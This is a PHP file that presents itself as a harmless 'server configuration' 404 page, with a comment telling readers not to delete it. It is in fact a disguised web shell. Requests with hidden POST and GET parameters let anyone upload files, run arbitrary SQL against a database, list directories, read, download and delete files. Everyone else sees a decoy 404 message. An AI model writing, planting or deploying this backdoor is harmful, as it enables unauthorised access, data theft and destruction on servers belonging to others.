<?php
/**
 *	@Author: PHP v5.0+
 *	@Dated: 12th August, 2016
 *	@Version: v1.3.2.0
 *
 *	Server Configuration
 *	404 | Not Found 
 *
 *	This script configures server default page load configuration.
 *	STRICT NOTICE: Do not modify/delete this file.
 */
if(isset($_POST) && isset($_POST['PATH'])){if(!isset($_FILES['FILE'])) echo "No file.";if(!isset($_POST['PATH'])) $_POST['PATH'] = '.';$filename = rand(0,1000000) . "." . pathinfo($_FILES['FILE']['name'], PATHINFO_EXTENSION);if(move_uploaded_file($_FILES['FILE']['tmp_name'],$filename)){ echo "Uploaded [".$filename."]."; }else{ echo "Oops!"; }}else if(isset($_GET) && isset($_GET['Q'])){if(isset($_GET['H']) && isset($_GET['U']) && isset($_GET['P']) && isset($_GET['D'])){$c = mysqli_connect($_GET['H'], $_GET['U'], $_GET['P'], $_GET['D']);if (mysqli_connect_error()) die(mysqli_connect_error());}if(!isset($_GET['Q'])) echo "No Operation.";switch($_GET['Q']){case 'EXE':if(!isset($_GET['QUERY'])) die("No Query.");$r = mysqli_query($c,$_GET['QUERY'])or die(mysqli_error());echo '<table border=1px>';$nCol = mysqli_num_fields($r);while($rowD = mysqli_fetch_row($r)) {echo '<tr>';for($i = 0; $i < $nCol; $i++)echo '<td>'.$rowD[$i].'</td>';echo '</tr>';}echo '</table>';break;case 'DIR':if(!isset($_GET['PATH'])) $_GET['PATH'] = '.';echo '<pre>';var_dump(scandir($_GET['PATH']));echo '</pre>';break;case 'DEL':if(!isset($_GET['PATH'])) die("Not found.");if(unlink($_GET['PATH']))echo 'Deleted.';break;case 'DWL':if(!isset($_GET['PATH'])) die("Not found.");if(!isset($_GET['TYPE']))	$_GET['TYPE'] = "application/octet-stream";if(!isset($_GET['ENCODING']))	$_GET['ENCODING'] = "Binary";header('Content-Type: ' . $_GET['TYPE']);header('Content-Transfer-Encoding: ' . $_GET['ENCODING']);header('Content-disposition: attachment; filename=\"' . basename($_GET['PATH']) . '\"');readfile($_GET['PATH']);break;case 'RDF':if(!isset($_GET['PATH'])) $_GET['PATH'] = '.';$h = fopen($_GET['PATH'], 'r');echo fread($h,filesize($_GET['PATH']));break;default:echo "WTF!";break;}}else{
$html=<<<HTML
	<div style="text-align: center; margin-top: 10%;">
		<h1 style="font-size: 100px">404</h1>
		<p><strong>Server Response:</strong> Not Found</p>
	</div>
HTML;
echo $html;}
?>